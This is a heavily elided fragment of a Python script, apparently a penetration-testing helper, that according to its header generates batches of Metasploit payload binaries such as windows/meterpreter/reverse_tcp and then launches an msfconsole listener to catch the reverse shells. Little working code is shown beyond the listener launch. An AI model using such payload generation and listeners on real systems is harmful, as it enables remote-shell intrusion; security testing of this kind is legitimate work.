...
#
# GenPayloads.py
# Simple python script to generate a number of metasploit payload binaries and
# then optionally start a handler for testing
# ex: python GenPayloads.py windows/meterpreter/reverse_tcp
# 192.168.1.2 443 100 no
#
...
def build(payload, lhost, lport):
    try:
        ...
        filewrite.close()
        subprocess.Popen("msfconsole -L -r listener.rc", shell=True).wait()
    except:
        return '*error*'
